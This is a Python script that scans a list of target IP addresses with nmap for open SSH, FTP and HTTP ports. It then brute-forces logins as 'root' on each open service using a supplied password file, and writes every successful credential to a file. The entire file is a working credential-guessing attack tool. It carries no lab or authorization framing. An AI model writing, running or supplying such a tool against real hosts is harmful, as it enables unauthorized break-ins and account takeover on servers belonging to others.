import nmap
import paramiko
import socket
import ftplib
import requests

# File paths for input and output
target_ips_file = input("Enter the Target IP file Path: ")
passwords_file = input("Enter Path to Password file: ")
open_ports_ips_file = "open_ports_ips.txt"
successful_logins_file = "successful_logins.txt"
ssh_port = 22  # SSH default port
ftp_port = 21  # FTP default port
http_port = 80  # HTTP default port


# Function to load IP addresses from file
def load_ips(filename):
    with open(filename, 'r') as file:
        ips = [line.strip() for line in file.readlines()]
    return ips


# Function to load passwords from file
def load_passwords(filename):
    with open(filename, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]
    return passwords


# Function to scan for open ports (SSH, FTP, HTTP)
def scan_for_open_ports(ip_list, ports):
    scanner = nmap.PortScanner()
    open_ports_ips = {port: [] for port in ports}
    for ip in ip_list:
        # Scan the specified ports
        scanner.scan(ip, ','.join(map(str, ports)))
        for port in ports:
            if ip in scanner.all_hosts() and scanner[ip].has_tcp(port) and scanner[ip]['tcp'][port]['state'] == 'open':
                open_ports_ips[port].append(ip)
                print(f"Found open port {port} on {ip}")

    # Save IPs with open ports to a file
    with open(open_ports_ips_file, 'w') as f:
        for port in ports:
            for ip in open_ports_ips[port]:
                f.write(f"{ip} - Port {port}\n")

    return open_ports_ips


# Function to attempt SSH login with a list of passwords
def try_ssh_login(ip, username, password_list):
    for password in password_list:
        try:
            # Setup SSH client with paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=ssh_port, username=username, password=password, timeout=3)
            print(f"SSH: Successful login on {ip} with password: {password}")

            # Save successful login to a file
            with open(successful_logins_file, 'a') as f:
                f.write(f"SSH - IP: {ip}, Password: {password}\n")

            ssh.close()
            return True
        except paramiko.AuthenticationException:
            print(f"SSH: Failed login on {ip} with password: {password}")
            continue
        except (socket.error, paramiko.SSHException) as e:
            print(f"SSH: Error connecting to {ip}: {e}")
            break
    return False


# Function to attempt FTP login with a list of passwords
def try_ftp_login(ip, username, password_list):
    for password in password_list:
        try:
            # Setup FTP client
            ftp = ftplib.FTP(ip)
            ftp.login(user=username, passwd=password)
            print(f"FTP: Successful login on {ip} with password: {password}")

            # Save successful login to a file
            with open(successful_logins_file, 'a') as f:
                f.write(f"FTP - IP: {ip}, Password: {password}\n")

            ftp.quit()
            return True
        except ftplib.error_perm:
            print(f"FTP: Failed login on {ip} with password: {password}")
            continue
        except ftplib.all_errors as e:
            print(f"FTP: Error connecting to {ip}: {e}")
            break
    return False


# Function to attempt HTTP login with a list of passwords
def try_http_login(ip, username, password_list):
    for password in password_list:
        try:
            # Setup HTTP request
            url = f"http://{ip}/login"  # Assuming the login page is at /login
            payload = {'username': username, 'password': password}
            response = requests.post(url, data=payload, timeout=3)

            if response.status_code == 200 and 'login success' in response.text.lower():  # Adjust this condition
                print(f"HTTP: Successful login on {ip} with password: {password}")

                # Save successful login to a file
                with open(successful_logins_file, 'a') as f:
                    f.write(f"HTTP - IP: {ip}, Password: {password}\n")

                return True
            else:
                print(f"HTTP: Failed login on {ip} with password: {password}")
        except requests.RequestException as e:
            print(f"HTTP: Error connecting to {ip}: {e}")
            break
    return False


# Main function to perform the scan and login attempts
def main():
    # Load IP addresses and passwords from files
    target_ips = load_ips(target_ips_file)
    passwords = load_passwords(passwords_file)

    # Ports to scan (SSH, FTP, HTTP)
    ports_to_scan = [ssh_port, ftp_port, http_port]

    print("Scanning for open ports (SSH, FTP, HTTP)...")
    open_ports_ips = scan_for_open_ports(target_ips, ports_to_scan)

    print("Attempting logins...")
    username = "root"  # Default username for testing; adjust as needed

    # Loop through each open port and attempt login
    for port in open_ports_ips[ssh_port]:
        try_ssh_login(port, username, passwords)

    for port in open_ports_ips[ftp_port]:
        try_ftp_login(port, username, passwords)

    for port in open_ports_ips[http_port]:
        try_http_login(port, username, passwords)


if __name__ == "__main__":
    main()
